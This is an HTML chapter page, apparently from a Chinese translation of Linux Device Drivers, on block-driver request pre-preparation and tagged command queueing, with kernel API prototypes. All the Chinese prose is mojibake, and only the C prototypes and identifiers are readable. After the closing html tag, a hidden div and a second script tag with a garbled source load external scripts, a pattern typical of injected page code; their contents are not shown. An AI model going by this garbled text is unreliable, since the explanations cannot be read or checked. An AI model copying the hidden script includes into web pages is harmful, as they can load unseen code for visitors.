<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>16.4.&#160;һЩϸ-Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch16.html" title="&#160;16&#160;&#160;">
<link rel="prev" href="ch16s03.html" title="16.3.&#160;">
<link rel="next" href="ch16s05.html" title="16.5.&#160;ٲο">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">16.4.&#160;һЩϸ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch16s03.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;16&#160;&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch16s05.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="SomeOtherDetails.sect1"></a>16.4.&#160;һЩϸ</h2></div></div></div>
<p>ںǿļķ, ڸ߼߿Ȥ. ڱдһȷݶҪ, ĳЩ¿õ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="CommandPrePreparation.sect2"></a>16.4.1.&#160;Ԥ׼</h3></div></div></div>
<p>ΪṩһԤ, Ǳ elv_next_request ǰ. ǰ, Ƿɱȫ, ߽ά.</p>
<p>ʹ, һ׼, ҪӦԭ:</p>
<pre class="programlisting">
typedef int (prep_rq_fn) (request_queue_t *queue, struct request *req); 
</pre>
<p>ṹһԱ cmd, һ BLK_MAX_CDB ֽڵ; ɱ׼洢ʵʵӲ(κϢ). Ӧһеֵ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>BLKPREP_OK </span></span></dt>
<dd><p>׼, ɱݸ.</p></dd>
<dt><span class="term"><span>BLKPREP_KILL </span></span></dt>
<dd><p>; һʧ.</p></dd>
<dt><span class="term"><span>BLKPREP_DEFER </span></span></dt>
<dd><p>޷. λڶеǰ, ǲܴݸ.</p></dd>
</dl></div>
<p>׼ elv_next_request 󷵻ص֮ǰ̵.  BLKPREP_DEFER,  elv_next_request ظķֵ NULL. õ, , 豸ѴﵽܹȺĿ.</p>
<p>Ϊʹ׼, :</p>
<pre class="programlisting">
void blk_queue_prep_rq(request_queue_t *queue, prep_rq_fn *func); 
</pre>
<p>ȱʡ, û׼.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TaggedCommandQueueing.sect2"></a>16.4.2.&#160;ʶŶ</h3></div></div></div>
<p>ͬʱж󱻼Ӳ, ֧ĳֱʶŶ(TCQ). TCQ 򵥵˵ǹһ "tag" ÿļ, ע⵱ÿʱ, ɸ֪һ. ǰں˰汾, ʵ TCQ ĿòԼеĹ; 2.6, һ TCQ ֿ֧Ѿӵ, Ըеʹ.</p>
<p>бŶ, Ӧڳʼʱ֪ͨںʵ, ʹ:</p>
<pre class="programlisting">
int blk_queue_init_tags(request_queue_t *queue, int depth, struct blk_queue_tag *tags);
</pre>
<p>, queue ,  depth 豸ܹκʱӵеĵȴıĿ. tags һѡָָһ struct blk_queue_tag ṹ;  depth . , tags  NULL,  blk_queue_init_tags  . , , ҪͶ豸ͨõ tags, ɴָ(洢 queue_tags Ա)һ. ӦӲԼ; Ҫʼ鲢Ҳʼģ.</p>
<p>Ϊ blk_queue_init_tags ڴ, ʧ. ǸһĴ.</p>
<p>豸ɴıǵĿı, ֪ͨں, ʹ:</p>
<pre class="programlisting">
int blk_queue_resize_tags(request_queue_t *queue, int new_depth); 
</pre>
<p>ڼ䱻. ÿʧ, һ.</p>
<p>һǺһṹĹ blk_queue_start_tag , ڳԱʱ:</p>
<pre class="programlisting">
int blk_queue_start_tag(request_queue_t *queue, struct request *req); 
</pre>
<p>һ tag , , 洢ʶ req-&gt;tag, ҷ 0. Ӷн, Լıʶٽṹ, ӦСĲӶн, ʹñʶ. ûбʶ, blk_queue_start_tag ڶвҷһֵ.</p>
<p>һеĴͶ, Ӧرʶ, ʹ:</p>
<pre class="programlisting">
void blk_queue_end_tag(request_queue_t *queue, struct request *req); 
</pre>
<p>һ, ж, ڵ֮ǰ. Ӧ end_that_request_first  0 ֮(ζ), Ҫڵ end_that_request_last ֮ǰ. סѾӶн, ڴ˵һ.</p>
<p>Ҫҵһʶϵ(, ), ʹ blk_queue_find_tag:</p>
<pre class="programlisting">
struct request *blk_queue_find_tag(request_queue_t *qeue, int tag);
</pre>
<p>ֵǹṹ, ЩѾĳ.</p>
<p>س, ܷԼòλ߶һ豸һЩĴ. , κεȴеıʶ. ṩһð»ָ:</p>
<pre class="programlisting">
void blk_queue_invalidate_tags(request_queue_t *queue); 
</pre>
<p>еĵȴıʶ, ҽŻ. ʱж.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch16s03.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch16.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch16s05.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">16.3.&#160;&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;16.5.&#160;ٲο</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>